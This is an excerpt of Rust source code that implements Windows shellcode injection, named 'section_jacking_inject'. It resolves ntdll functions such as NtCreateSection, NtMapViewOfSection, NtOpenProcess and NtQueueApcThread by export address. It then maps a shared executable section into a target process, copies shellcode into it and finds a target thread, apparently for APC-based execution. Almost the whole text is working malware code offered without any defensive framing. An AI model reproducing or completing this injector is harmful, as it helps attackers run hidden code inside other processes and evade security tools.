...
type NtMapViewOfSectionFn = unsafe extern "system" fn(
    isize, isize, *mut *mut c_void, usize, usize,
...
type NtOpenProcessFn = unsafe extern "system" fn(
    *mut isize, u32, *mut c_void, *mut c_void,
) -> i32;

type NtQueueApcThreadFn = unsafe extern "system" fn(
    isize, *mut c_void, usize, usize, usize,
) -> i32;

type NtCloseFn = unsafe extern "system" fn(isize) -> i32;

type NtOpenThreadFn = unsafe extern "system" fn(
    *mut isize, u32, *mut c_void, *mut c_void,
) -> i32;
...
type CreateToolhelp32SnapshotFn =
    unsafe extern "system" fn(u32, u32) -> isize;
type Thread32FirstFn =
    unsafe extern "system" fn(isize, *mut ThreadEntry32W) -> i32;
type Thread32NextFn =
    unsafe extern "system" fn(isize, *mut ThreadEntry32W) -> i32;
...
unsafe fn resolve_fns() -> Option<ResolvedFns> {
    let a = |dll: &[u8], name: &[u8]| -> Option<usize> {
        crate::resolve::export_addr(dll, name)
    };
    Some(ResolvedFns {
        nt_create_section: core::mem::transmute(
            a(b"ntdll.dll", b"NtCreateSection")?),
        nt_map_view: core::mem::transmute(
            a(b"ntdll.dll", b"NtMapViewOfSection")?),
        nt_unmap_view: core::mem::transmute(
            a(b"ntdll.dll", b"NtUnmapViewOfSection")?),
        nt_open_process: core::mem::transmute(
            a(b"ntdll.dll", b"NtOpenProcess")?),
        nt_queue_apc: core::mem::transmute(
            a(b"ntdll.dll", b"NtQueueApcThread")?),
        nt_close: core::mem::transmute(
            a(b"ntdll.dll", b"NtClose")?),
        nt_open_thread: core::mem::transmute(
            a(b"ntdll.dll", b"NtOpenThread")?),
...
unsafe fn open_target_process(fns: &ResolvedFns, pid: u32) -> Option<isize> {
    let access: u32 = PROCESS_VM_OPERATION | PROCESS_VM_WRITE
    ...
    let mut h: isize = 0;
    if (fns.nt_open_process)(&mut h, access, &mut cid as *mut ClientId as *mut c_void, core::ptr::null_mut()) == 0 {
        Some(h)
    } else {
        None
    }
...
unsafe fn create_section(fns: &ResolvedFns, size: usize) -> Option<isize> {
    ...
    if (fns.nt_create_section)(&mut h, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        attr, &mut max, PAGE_EXECUTE_READ, SEC_COMMIT, 0isize) == 0 {
        Some(h)
    } else {
        None
    }
...
unsafe fn map_local_view(fns: &ResolvedFns, section: isize, size: usize) -> Option<*mut c_void> {
    ...
    let mut off: i64 = 0;
    if (fns.nt_map_view)(section, -1isize, &mut view, 0, 0,
        &mut off, &mut vs, 2, 0, PAGE_READWRITE) == 0 {
        Some(view)
    } else {
        None
    }
...
unsafe fn map_remote_view(fns: &ResolvedFns, section: isize, target: isize, size: usize) -> Option<*mut c_void> {
    let mut view: *mut c_void = core::ptr::null_mut();
    let mut vs: usize = size;
    let mut off: i64 = 0;
    if (fns.nt_map_view)(section, target, &mut view, 0, 0,
        &mut off, &mut vs, 2, 0, PAGE_EXECUTE_READ) == 0 {
        Some(view)
    } else {
        None
    }
...
unsafe fn find_target_thread(fns: &ResolvedFns, pid: u32) -> Option<isize> {
    ...
    if snap == -1 || snap == 0 { return None; }

    let mut te = ThreadEntry32W {
        dw_size: core::mem::size_of::<ThreadEntry32W>() as u32,
        _cnt_usage: 0, th32_thread_id: 0, th32_owner_process_id: 0,
        _tp_base_pri: 0, _tp_delta_pri: 0, _dw_flags: 0,
    };
    ...
    if (fns.thread32_first)(snap, &mut te) != 0 {
        loop {
            if te.th32_owner_process_id == pid {
                ...
                let mut h: isize = 0;
                if (fns.nt_open_thread)(&mut h, THREAD_SET_CONTEXT,
                    core::ptr::null_mut(), &mut cid as *mut ClientId as *mut c_void) == 0 {
                    found = Some(h);
                    break;
                }
            }
            te.dw_size = core::mem::size_of::<ThreadEntry32W>() as u32;
            if (fns.thread32_next)(snap, &mut te) == 0 { break; }
        }
    }
    (fns.nt_close)(snap);
    found
...
pub unsafe fn section_jacking_inject(
    ...
    let h_target = open_target_process(&fns, target_pid)
        .ok_or("NtOpenProcess failed")?;
    let h_section = create_section(&fns, shellcode.len())
        .ok_or("NtCreateSection failed")?;
    let local_view = map_local_view(&fns, h_section, shellcode.len())
        .ok_or("local NtMapViewOfSection failed")?;

    core::ptr::copy_nonoverlapping(
        shellcode.as_ptr(), local_view as *mut u8, shellcode.len());
    ...
    let h_thread = find_target_thread(&fns, target_pid)
        .ok_or("no target thread found")?;
